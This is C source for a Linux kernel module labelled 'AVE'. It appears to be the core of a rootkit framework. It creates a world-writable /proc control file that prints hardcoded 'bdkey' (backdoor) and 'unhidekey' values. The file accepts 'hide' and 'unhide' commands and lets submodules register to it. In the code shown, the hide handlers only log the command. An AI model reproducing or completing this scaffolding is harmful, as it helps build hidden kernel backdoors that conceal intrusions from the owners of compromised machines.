#include "kernel.h"
#include "var.h"
#include "modul.h"

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include <linux/uaccess.h>
#include <linux/version.h>
#include <linux/slab.h>
#include <linux/string.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("ER");
MODULE_DESCRIPTION("AVE Kernel Module");

#define STR_HELPER(x) #x
#define STR(x) STR_HELPER(x)
const char procname[] = STR(PROCNAME);

char auto_bdkey[KEY_SIZE + 1]    = "00000000000000000000000000000009";
char auto_unhidekey[KEY_SIZE + 1] = "00000000000000000000000000000009";

int ave_debug_level = 2;
struct mutex ave_lock;

static struct module_interface *submodules[MAX_MODULES];
static int submodule_count = 0;

static int ave_proc_show(struct seq_file *m, void *v)
{
    int i;
    seq_printf(m, "AVE Kernel Module\n");
    seq_printf(m, "Interface: /proc/%s\n", procname);
    seq_printf(m, "bdkey: %s\n", auto_bdkey);
    seq_printf(m, "unhidekey: %s\n", auto_unhidekey);
    seq_printf(m, "Debug Level: %d\n", ave_debug_level);
    seq_printf(m, "Registered Submodules (%d):\n", submodule_count);
    for (i = 0; i < submodule_count; i++) {
        if (submodules[i])
            seq_printf(m, "  - %s\n", submodules[i]->name);
    }
    return 0;
}

static int ave_proc_open(struct inode *inode, struct file *file)
{
    return single_open(file, ave_proc_show, NULL);
}

static ssize_t ave_proc_write(struct file *file, const char __user *buf, size_t count, loff_t *f_pos)
{
    char *kbuf;
    int ret;

    if (count == 0 || count > 256)
        return -EINVAL;
    kbuf = kmalloc(count + 1, GFP_KERNEL);
    if (!kbuf)
        return -ENOMEM;
    if (copy_from_user(kbuf, buf, count)) {
        kfree(kbuf);
        return -EFAULT;
    }
    kbuf[count] = '\0';
    ret = ave_handle_command(kbuf, count);
    kfree(kbuf);
    return (ret < 0) ? ret : count;
}

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,6,0)
static const struct proc_ops ave_proc_ops = {
    .proc_open    = ave_proc_open,
    .proc_read    = seq_read,
    .proc_lseek   = seq_lseek,
    .proc_release = single_release,
    .proc_write   = ave_proc_write,
};
#else
static const struct file_operations ave_proc_fops = {
    .owner   = THIS_MODULE,
    .open    = ave_proc_open,
    .read    = seq_read,
    .llseek  = seq_lseek,
    .release = single_release,
    .write   = ave_proc_write,
};
#endif

int register_submodule(struct module_interface *mod)
{
    int ret = 0, i;
    mutex_lock(&ave_lock);
    if (submodule_count >= MAX_MODULES) {
        ret = -ENOMEM;
        goto out;
    }
    for (i = 0; i < submodule_count; i++) {
        if (submodules[i] && strcmp(submodules[i]->name, mod->name) == 0) {
            ret = -EEXIST;
            goto out;
        }
    }
    if (mod->init) {
        ret = mod->init();
        if (ret)
            goto out;
    }
    submodules[submodule_count++] = mod;
out:
    mutex_unlock(&ave_lock);
    return ret;
}
EXPORT_SYMBOL(register_submodule);

int unregister_submodule(const char *name)
{
    int i, ret = -ENOENT, j;
    mutex_lock(&ave_lock);
    for (i = 0; i < submodule_count; i++) {
        if (submodules[i] && strcmp(submodules[i]->name, name) == 0) {
            if (submodules[i]->exit)
                submodules[i]->exit();
            for (j = i; j < submodule_count - 1; j++)
                submodules[j] = submodules[j + 1];
            submodules[submodule_count - 1] = NULL;
            submodule_count--;
            ret = 0;
            break;
        }
    }
    mutex_unlock(&ave_lock);
    return ret;
}
EXPORT_SYMBOL(unregister_submodule);

int ave_handle_command(const char *cmd, size_t len)
{
    char *cmd_cpy, *token;
    int ret = 0;
    cmd_cpy = kstrdup(cmd, GFP_KERNEL);
    if (!cmd_cpy)
        return -ENOMEM;
    token = strsep(&cmd_cpy, " \t\n");
    if (!token) {
        ret = -EINVAL;
        goto out;
    }
    if (strcmp(token, "set_debug") == 0) {
        char *level_str = strsep(&cmd_cpy, " \t\n");
        if (!level_str) {
            ret = -EINVAL;
            goto out;
        }
        ret = kstrtoint(level_str, 10, &ave_debug_level);
    } else if (strcmp(token, "unhide") == 0) {
        pr_info("AVE: Received unhide command [%s]\n", cmd);
    } else if (strcmp(token, "hide") == 0) {
        pr_info("AVE: Received hide command [%s]\n", cmd);
    } else {
        pr_info("AVE: Unknown command [%s]\n", token);
        ret = -EINVAL;
    }
out:
    kfree(cmd_cpy);
    return ret;
}

static int __init ave_init(void)
{
    int ret;
    mutex_init(&ave_lock);
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,6,0)
    ret = proc_create(procname, 0666, NULL, &ave_proc_ops) ? 0 : -ENOMEM;
#else
    ret = proc_create(procname, 0666, NULL, &ave_proc_fops) ? 0 : -ENOMEM;
#endif
    if (ret) {
        pr_err("AVE: Failed to create /proc/%s\n", procname);
        return ret;
    }
    pr_info("AVE: /proc/%s created\n", procname);
    return 0;
}

static void __exit ave_exit(void)
{
    int i;
    mutex_lock(&ave_lock);
    for (i = submodule_count - 1; i >= 0; i--) {
        if (submodules[i] && submodules[i]->exit)
            submodules[i]->exit();
    }
    submodule_count = 0;
    mutex_unlock(&ave_lock);
    remove_proc_entry(procname, NULL);
    pr_info("AVE: Module unloaded\n");
}

module_init(ave_init);
module_exit(ave_exit);
